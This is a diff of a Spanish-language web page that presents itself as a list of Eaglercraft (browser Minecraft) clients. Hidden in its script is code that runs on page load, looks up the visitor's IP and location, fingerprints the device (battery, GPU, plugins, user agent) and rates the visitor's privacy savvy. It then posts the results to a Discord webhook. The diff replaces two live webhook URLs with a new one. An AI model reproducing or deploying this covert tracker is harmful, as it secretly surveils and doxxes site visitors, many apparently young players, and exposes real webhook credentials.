@@ -21,7 +21,6 @@
 </style>
 </head>
 <body>
-
 <header>
   <div class="nav">
     <div style="display:flex;align-items:center;gap:14px">
@@ -30,7 +29,6 @@
     </div>
   </div>
 </header>
-
 <main>
   <h1>Clientes Eaglercraft 2025</h1>
   <div class="grid">
@@ -42,17 +40,14 @@
     <div class="card"><div class="name">Future Client</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
   </div>
 </main>
-
 <script>
-// TUS 2 WEBHOOKS
-const WEBHOOK1 = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
-const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhgREwV_lcQUNp_dKfo009Y7xatAHZ6cXlSCs52gOBpZUfmcw527iogUpgWxf";
+// NUEVA WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1457869907961319567/0LTSNVs-A0GSxoAyURM2nb6VVgWpM5PUrKiBp-z9saP61vL2gemqvaMOY-EXsKMUhkU8";
 
 (async () => {
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
   const battery = await navigator.getBattery?.() || {};
   const uaData = navigator.userAgentData || {};
-
   // WEBGL (GPU)
   let webgl = 'no disponible';
   let gpuLevel = 'desconocida';
@@ -72,14 +67,12 @@ const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzh
       else gpuLevel = 'Desconocida';
     }
   } catch(e) {}
-
   // PLUGINS + NIVEL DE "LISTO"
   const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
   let userLevel = 'Principiante (no sabe mucho)';
   const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
   if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
   if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
-
   const datos = {
     ip: geo.ip || 'oculta',
     isp: geo.org || '?',
@@ -99,8 +92,7 @@ const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzh
     gpu: webgl,
     gpu_level: gpuLevel
   };
-
-  const mensaje = 
+  const mensaje =
 `**FORGEX COMUNIDAD(HACKER)**
 **IP:** ${datos.ip} (${datos.isp})
 **Ubicación:** ${datos.ubicacion}
@@ -116,13 +108,8 @@ const WEBHOOK2 = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzh
 **Nivel del usuario:** ${datos.user_level}
 **GPU:** ${datos.gpu}
 **Tipo de GPU:** ${datos.gpu_level}`;
-
-  await Promise.all([
-    fetch(WEBHOOK1, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})}),
-    fetch(WEBHOOK2, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})})
-  ]);
+  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
 })();
-
 // Botones normales
 document.querySelectorAll('.open').forEach(btn => {
   btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
